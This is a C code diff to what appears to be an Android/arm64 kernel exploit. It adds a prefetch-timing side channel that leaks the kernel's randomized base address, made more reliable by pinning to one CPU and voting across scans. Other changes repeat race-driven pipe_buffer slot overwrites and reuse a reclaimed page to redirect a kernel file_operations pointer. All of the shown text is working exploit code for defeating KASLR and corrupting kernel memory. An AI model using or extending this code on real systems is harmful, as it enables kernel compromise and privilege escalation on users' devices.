@@ -198,6 +198,245 @@ int p0_virtual_base_probe;
 static int slide_commit_stext(uint64_t stext, const char *source);
 static const uint64_t slide_max_offset = 0x3f8000ULL;
 
+#if defined(APP_PREFETCH_SLIDE) && APP_PREFETCH_SLIDE
+#ifndef SLIDE_PREFETCH_SAMPLES
+#define SLIDE_PREFETCH_SAMPLES 32
+#endif
+#ifndef SLIDE_PREFETCH_BURST
+#define SLIDE_PREFETCH_BURST 512
+#endif
+#ifndef SLIDE_PREFETCH_SCAN_STEP
+#define SLIDE_PREFETCH_SCAN_STEP 0x8000ULL
+#endif
+#ifndef SLIDE_PREFETCH_MAX_OFFSET
+#define SLIDE_PREFETCH_MAX_OFFSET slide_max_offset
+#endif
+#ifndef SLIDE_PREFETCH_EDGE_RUN
+#define SLIDE_PREFETCH_EDGE_RUN 8
+#endif
+#ifndef SLIDE_PREFETCH_REPEATS
+#define SLIDE_PREFETCH_REPEATS 5
+#endif
+#ifndef SLIDE_PREFETCH_MIN_CONSENSUS
+#define SLIDE_PREFETCH_MIN_CONSENSUS 3
+#endif
+
+static inline uint64_t slide_prefetch_counter(void) {
+  uint64_t value;
+
+  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb" : "=r"(value));
+  return value;
+}
+
+static uint64_t slide_prefetch_measure(uintptr_t address) {
+  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+  uint64_t started = slide_prefetch_counter();
+  for (int index = 0; index < SLIDE_PREFETCH_BURST; index++) {
+    __asm__ volatile("prfm plil1keep, [%0]" : : "r"(address) : "memory");
+  }
+  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+  return slide_prefetch_counter() - started;
+}
+
+static int slide_prefetch_compare_u64(const void *left, const void *right) {
+  uint64_t a = *(const uint64_t *)left;
+  uint64_t b = *(const uint64_t *)right;
+  return (a > b) - (a < b);
+}
+
+static uint64_t slide_prefetch_quantile(uintptr_t address) {
+  uint64_t samples[SLIDE_PREFETCH_SAMPLES];
+
+  for (size_t index = 0; index < SLIDE_PREFETCH_SAMPLES; index++) {
+    samples[index] = slide_prefetch_measure(address);
+  }
+  qsort(samples, SLIDE_PREFETCH_SAMPLES, sizeof(samples[0]),
+        slide_prefetch_compare_u64);
+  return samples[SLIDE_PREFETCH_SAMPLES / 8];
+}
+
+static int slide_prefetch_controls(uintptr_t mapped, uintptr_t unmapped,
+                                   uint64_t *mapped_q,
+                                   uint64_t *unmapped_q) {
+  *mapped_q = slide_prefetch_quantile(mapped);
+  *unmapped_q = slide_prefetch_quantile(unmapped);
+  return *unmapped_q > *mapped_q && *unmapped_q - *mapped_q >= 8 &&
+         *unmapped_q - *mapped_q >= *mapped_q / 2;
+}
+
+static int slide_prefetch_measure_triplet(
+    uintptr_t candidate, uintptr_t mapped, uintptr_t unmapped,
+    uint64_t *candidate_q, uint64_t *mapped_q, uint64_t *unmapped_q) {
+  uint64_t candidate_samples[SLIDE_PREFETCH_SAMPLES];
+  uint64_t mapped_samples[SLIDE_PREFETCH_SAMPLES];
+  uint64_t unmapped_samples[SLIDE_PREFETCH_SAMPLES];
+
+  for (size_t index = 0; index < SLIDE_PREFETCH_SAMPLES; index++) {
+    candidate_samples[index] = slide_prefetch_measure(candidate);
+    mapped_samples[index] = slide_prefetch_measure(mapped);
+    unmapped_samples[index] = slide_prefetch_measure(unmapped);
+  }
+  qsort(candidate_samples, SLIDE_PREFETCH_SAMPLES,
+        sizeof(candidate_samples[0]), slide_prefetch_compare_u64);
+  qsort(mapped_samples, SLIDE_PREFETCH_SAMPLES, sizeof(mapped_samples[0]),
+        slide_prefetch_compare_u64);
+  qsort(unmapped_samples, SLIDE_PREFETCH_SAMPLES,
+        sizeof(unmapped_samples[0]), slide_prefetch_compare_u64);
+  size_t quantile = SLIDE_PREFETCH_SAMPLES / 8;
+  *candidate_q = candidate_samples[quantile];
+  *mapped_q = mapped_samples[quantile];
+  *unmapped_q = unmapped_samples[quantile];
+  return *unmapped_q > *mapped_q && *unmapped_q - *mapped_q >= 8 &&
+         *unmapped_q - *mapped_q >= *mapped_q / 2;
+}
+
+static uintptr_t slide_prefetch_find_once(void) {
+  unsigned char *unmapped = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (unmapped == MAP_FAILED) {
+    return (uintptr_t)-1;
+  }
+  uintptr_t unmapped_address = (uintptr_t)unmapped;
+  if (munmap(unmapped, PAGE_SIZE) != 0) {
+    return (uintptr_t)-1;
+  }
+
+  uintptr_t mapped_address = (uintptr_t)&slide_prefetch_measure;
+  uint64_t mapped_q = 0;
+  uint64_t unmapped_q = 0;
+  if (!slide_prefetch_controls(mapped_address, unmapped_address,
+                               &mapped_q, &unmapped_q)) {
+    pr_warning("slide prefetch controls rejected mapped=%llu unmapped=%llu\n",
+               (unsigned long long)mapped_q,
+               (unsigned long long)unmapped_q);
+    return (uintptr_t)-1;
+  }
+
+  const uintptr_t guard = SLIDE_PREFETCH_EDGE_RUN * SLIDE_PREFETCH_SCAN_STEP;
+  const uintptr_t scan_base = KIMAGE_TEXT_BASE - guard;
+  const uintptr_t scan_limit =
+      SLIDE_PREFETCH_MAX_OFFSET + guard +
+      (SLIDE_PREFETCH_EDGE_RUN - 1) * SLIDE_PREFETCH_SCAN_STEP;
+  uintptr_t edge = (uintptr_t)-1;
+  unsigned high_run = 0;
+  unsigned low_run = 0;
+
+  for (uintptr_t offset = 0; offset <= scan_limit;
+       offset += SLIDE_PREFETCH_SCAN_STEP) {
+    uint64_t candidate_q = 0;
+    uint64_t local_mapped = 0;
+    uint64_t local_unmapped = 0;
+    if (!slide_prefetch_measure_triplet(
+            scan_base + offset, mapped_address, unmapped_address,
+            &candidate_q, &local_mapped, &local_unmapped)) {
+      high_run = 0;
+      low_run = 0;
+      continue;
+    }
+    uint64_t threshold =
+        local_mapped + (local_unmapped - local_mapped) / 2;
+    int mapped = candidate_q <= threshold;
+
+    if (!mapped) {
+      low_run = 0;
+      if (high_run < SLIDE_PREFETCH_EDGE_RUN) {
+        high_run++;
+      }
+    } else if (high_run >= SLIDE_PREFETCH_EDGE_RUN) {
+      if (!low_run) {
+        edge = offset;
+      }
+      if (++low_run >= SLIDE_PREFETCH_EDGE_RUN) {
+        break;
+      }
+    } else {
+      high_run = 0;
+    }
+  }
+
+  if (edge == (uintptr_t)-1 || edge < guard) {
+    return (uintptr_t)-1;
+  }
+  uintptr_t slide = edge - guard;
+  if (slide > SLIDE_PREFETCH_MAX_OFFSET ||
+      (slide & (SLIDE_PREFETCH_SCAN_STEP - 1)) != 0) {
+    return (uintptr_t)-1;
+  }
+  return slide;
+}
+
+static int slide_prefetch_leak_kernel_base(void) {
+  uintptr_t values[SLIDE_PREFETCH_REPEATS];
+  uintptr_t consensus = (uintptr_t)-1;
+  unsigned successful = 0;
+  unsigned consensus_count = 0;
+  cpu_set_t original_set;
+  cpu_set_t pinned_set;
+
+  if (sched_getaffinity(0, sizeof(original_set), &original_set) != 0) {
+    pr_warning("slide prefetch get affinity failed errno=%d\n", errno);
+    return 0;
+  }
+  CPU_ZERO(&pinned_set);
+  int selected_cpu = -1;
+  for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
+    if (CPU_ISSET(cpu, &original_set)) {
+      CPU_SET(cpu, &pinned_set);
+      selected_cpu = cpu;
+      break;
+    }
+  }
+  if (selected_cpu < 0 ||
+      sched_setaffinity(0, sizeof(pinned_set), &pinned_set) != 0) {
+    pr_warning("slide prefetch pin failed cpu=%d errno=%d\n",
+               selected_cpu, errno);
+    return 0;
+  }
+
+  for (unsigned attempt = 0; attempt < SLIDE_PREFETCH_REPEATS; attempt++) {
+    values[attempt] = slide_prefetch_find_once();
+    if (values[attempt] == (uintptr_t)-1) {
+      pr_info("slide prefetch attempt=%u/%u result=none cpu=%d\n",
+              attempt + 1, SLIDE_PREFETCH_REPEATS, selected_cpu);
+      continue;
+    }
+    successful++;
+    unsigned count = 0;
+    for (unsigned prior = 0; prior <= attempt; prior++) {
+      if (values[prior] == values[attempt]) {
+        count++;
+      }
+    }
+    if (count > consensus_count) {
+      consensus_count = count;
+      consensus = values[attempt];
+    }
+    pr_info("slide prefetch attempt=%u/%u result=%08zx votes=%u cpu=%d\n",
+            attempt + 1, SLIDE_PREFETCH_REPEATS, values[attempt], count,
+            selected_cpu);
+  }
+
+  int restore_ok =
+      sched_setaffinity(0, sizeof(original_set), &original_set) == 0;
+  if (!restore_ok) {
+    pr_warning("slide prefetch restore affinity failed errno=%d\n", errno);
+    return 0;
+  }
+  /* A wrong virtual slide would make the later FOPS write unsafe.  Accept
+   * only one unanimous value across every valid scan, with at least three
+   * independent scans agreeing.  Control failures simply fall back to P0. */
+  if (successful < SLIDE_PREFETCH_MIN_CONSENSUS ||
+      consensus_count != successful) {
+    pr_warning("slide prefetch consensus rejected value=%08zx votes=%u/%u\n",
+               consensus, consensus_count, successful);
+    return 0;
+  }
+  pr_success("slide prefetch consensus value=%08zx votes=%u/%u cpu=%d\n",
+             consensus, consensus_count, successful, selected_cpu);
+  return slide_commit_stext(KIMAGE_TEXT_BASE + consensus, "prefetch");
+}
+#endif
+
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 #define SLIDE_TRACEFS_CANDIDATES 128
@@ -702,7 +941,7 @@ static void slide_wait_before_consume(int sequence) {
   }
 }
 
-static uint64_t slide_select_route_fine_delay_ticks(void) {
+static uint64_t slide_select_route_fine_delay_ticks(size_t route_index) {
 #if defined(APP_FOPS_ROUTE_FINE_DELAY_TICKS)
   const char *override_text = getenv("FINE_TICKS_OVERRIDE");
   if (override_text && *override_text) {
@@ -729,8 +968,19 @@ static uint64_t slide_select_route_fine_delay_ticks(void) {
     }
     attempt = value;
   }
+#if defined(APP_FOPS_FINE_DELAY_PER_ROUTE) && APP_FOPS_FINE_DELAY_PER_ROUTE
+  /* Fresh-page retries happen inside one supervisor attempt.  Advance the
+   * fine timing sweep locally as well, rather than repeating the same race
+   * point for every page in that child. */
+  if (route_index > 1) {
+    attempt += route_index - 1;
+  }
+#else
+  (void)route_index;
+#endif
   return delays[(attempt - 1) % (sizeof(delays) / sizeof(delays[0]))];
 #else
+  (void)route_index;
   return 0;
 #endif
 }
@@ -2236,11 +2486,33 @@ static int slide_trigger_physical_slot(size_t slot) {
   return 0;
 }
 
+static int slide_trigger_physical_slot_reliable(size_t slot) {
+#if defined(APP_P0_REDUNDANT_SLOT_WRITES) && \
+    APP_P0_REDUNDANT_SLOT_WRITES > 1
+  const int attempts = APP_P0_REDUNDANT_SLOT_WRITES;
+  int successes = 0;
+  /* The rt_mutex/MCAST result only proves that the scheduling window was
+   * entered; it does not prove that the target pipe_buffer was overwritten.
+   * These slots all write the same value, so repeat them before consuming the
+   * oracle.  One real hit is enough and later misses cannot undo it. */
+  for (int attempt = 1; attempt <= attempts; attempt++) {
+    int current = slide_trigger_physical_slot(slot);
+    successes += current != 0;
+    pr_info("p0 physical reliable slot=%zu attempt=%d/%d current=%d "
+            "successes=%d\n",
+            slot, attempt, attempts, current, successes);
+  }
+  return successes != 0;
+#else
+  return slide_trigger_physical_slot(slot);
+#endif
+}
+
 static int slide_restore_physical_oracle(void) {
   int gate_restored =
-      slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
+      slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_RESTORE_SLOT);
   int probe_restored =
-      slide_trigger_physical_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
+      slide_trigger_physical_slot_reliable(P0_ORACLE_PROBE_RESTORE_SLOT);
   pr_info("p0 physical restore triggers gate=%d probe=%d "
           "gate_page=%016zx probe_page=%016zx\n",
           gate_restored, probe_restored,
@@ -2300,7 +2572,8 @@ static int app_trigger_fops_slide_slot(size_t slot) {
     return 0;
   }
   delay_index++;
-  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
+  slide_route_fine_delay_ticks =
+      slide_select_route_fine_delay_ticks(delay_index);
   if (slide_route_fine_delay_ticks == UINT64_MAX) {
     return 0;
   }
@@ -2324,7 +2597,12 @@ static int app_trigger_fops_slide_slot(size_t slot) {
 int app_trigger_fops_slide_route(void) {
 #if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
     APP_FOPS_REUSE_VERIFIED_PAGE
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  return app_trigger_fops_slide_slot(0);
+#else
   return app_trigger_fops_slide_slot(P0_ORACLE_PRODUCTION_SLOT);
+#endif
 #else
   return app_trigger_fops_slide_slot(0);
 #endif
@@ -2382,7 +2660,8 @@ int app_trigger_fops_slide_route(void) {
     return 0;
   }
   delay_index++;
-  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
+  slide_route_fine_delay_ticks =
+      slide_select_route_fine_delay_ticks(delay_index);
   if (slide_route_fine_delay_ticks == UINT64_MAX) {
     return 0;
   }
@@ -2471,7 +2750,7 @@ static int slide_leak_physical_base(void) {
 #endif
       continue;
     }
-    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+    if (!slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_SLOT)) {
       pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
                fresh_attempt, fresh_page_attempts);
       fresh_attempt++;
@@ -2501,7 +2780,7 @@ static int slide_leak_physical_base(void) {
       slide_restore_physical_oracle();
       return 0;
     }
-    if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+    if (!slide_trigger_physical_slot_reliable(P0_ORACLE_PROBE_SLOT)) {
       slide_restore_physical_oracle();
       return 0;
     }
@@ -2529,6 +2808,36 @@ static int slide_leak_physical_base(void) {
     if (!slide_restore_physical_oracle()) {
       return 0;
     }
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+    app_fops_reused_page_ready = 0;
+    int reuse_prepared = prepare_reused_fops_payload(offset);
+    int reuse_redirected = 0;
+    int reuse_page_restored = 1;
+    int reuse_verified = 0;
+    if (reuse_prepared) {
+      reuse_redirected =
+          slide_trigger_physical_slot_reliable(P0_ORACLE_PRODUCTION_SLOT);
+      /* Restore slot 4's struct-page parent while the original slide bank is
+       * still present.  The verified rewrite below replaces that bank. */
+      reuse_page_restored = slide_trigger_physical_slot_reliable(
+          P0_ORACLE_GATE_RESTORE_SLOT);
+      if (!reuse_page_restored) {
+        pr_error("p0 fops page reuse metadata restore failed\n");
+        return 0;
+      }
+      reuse_verified = reuse_redirected && rewrite_reused_fops_payload();
+    }
+    app_fops_reused_page_ready = reuse_verified;
+    if (reuse_verified && !prepare_reused_fops_payload(offset)) {
+      pr_warning("p0 fops page reuse route refresh failed; using fresh page\n");
+      app_fops_reused_page_ready = 0;
+    }
+    pr_info("p0 fops page reuse prepared=%d redirected=%d restored=%d "
+            "verified=%d page=%016zx slide=%08zx\n",
+            reuse_prepared, reuse_redirected, reuse_page_restored,
+            app_fops_reused_page_ready, page_base, offset);
+#endif
     slide_p0_session_fresh = 1;
     size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
     pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
@@ -2541,7 +2850,7 @@ static int slide_leak_physical_base(void) {
   if (!page_base) {
     return 0;
   }
-  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+  if (!slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_SLOT)) {
     pr_error("p0 physical pipe gate trigger failed\n");
     return 0;
   }
@@ -2563,7 +2872,7 @@ static int slide_leak_physical_base(void) {
     slide_restore_physical_oracle();
     return 0;
   }
-  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+  if (!slide_trigger_physical_slot_reliable(P0_ORACLE_PROBE_SLOT)) {
     slide_restore_physical_oracle();
     return 0;
   }
@@ -2616,7 +2925,7 @@ static int slide_leak_virtual_base(uintptr_t physical_offset) {
   }
   /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
   app_publish_p0_dirty();
-  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+  if (!slide_trigger_physical_slot_reliable(P0_ORACLE_GATE_SLOT)) {
     pr_error("p0 virtual pipe gate trigger failed\n");
     goto out;
   }
@@ -2629,7 +2938,7 @@ static int slide_leak_virtual_base(uintptr_t physical_offset) {
     goto out;
   }
   restore_needed = 1;
-  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+  if (!slide_trigger_physical_slot_reliable(P0_ORACLE_PROBE_SLOT)) {
     goto out;
   }
   ashmem_fops = scan_p0_virtual_base_pointer();
@@ -2831,7 +3140,8 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   kaslr_slide = slide;
   slide_p0_offset = slide;
   kaslr_done = 1;
-  data_addr_canonical = strcmp(source, "tracefs") == 0;
+  data_addr_canonical = strcmp(source, "tracefs") == 0 ||
+                        strcmp(source, "prefetch") == 0;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   /* A tracefs leak is also acquired in this process, so it satisfies the
    * fresh-slide guard without reusing P0 state from a previous child. */
@@ -2908,23 +3218,46 @@ int slide_leak_kernel_base(void) {
   int force_p0 = slide_source && strcmp(slide_source, "p0") == 0;
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
   int force_tracefs = slide_source && strcmp(slide_source, "tracefs") == 0;
+  int force_prefetch =
+      slide_source && strcmp(slide_source, "prefetch") == 0;
   if (slide_source && *slide_source && !force_p0 && !force_tracefs &&
+      !force_prefetch &&
       strcmp(slide_source, "auto") != 0) {
-    pr_error("slide unknown source=%s (use auto, tracefs, or p0)\n",
+    pr_error("slide unknown source=%s (use auto, tracefs, prefetch, or p0)\n",
              slide_source);
     return 0;
   }
   pr_info("slide source mode=%s\n",
           slide_source && *slide_source ? slide_source : "auto");
-  if (!force_p0) {
+  if (!force_p0 && !force_prefetch) {
     if (slide_tracefs_leak_kernel_base()) {
       return 1;
     }
     if (force_tracefs) {
       return 0;
     }
-    pr_warning("slide tracefs failed; falling back to physical P0\n");
+    pr_warning("slide tracefs failed\n");
   }
+#if defined(APP_PREFETCH_SLIDE) && APP_PREFETCH_SLIDE
+  int auto_prefetch = 0;
+#if defined(APP_PREFETCH_SLIDE_DEFAULT) && APP_PREFETCH_SLIDE_DEFAULT
+  auto_prefetch = 1;
+#endif
+  if (!force_p0 && !force_tracefs && (force_prefetch || auto_prefetch)) {
+    if (slide_prefetch_leak_kernel_base()) {
+      return 1;
+    }
+    if (force_prefetch) {
+      return 0;
+    }
+    pr_warning("slide prefetch failed; falling back to physical P0\n");
+  }
+#else
+  if (force_prefetch) {
+    pr_error("slide prefetch source unavailable\n");
+    return 0;
+  }
+#endif
   return slide_leak_physical_base();
 #else
   if (slide_source && *slide_source && !force_p0 &&
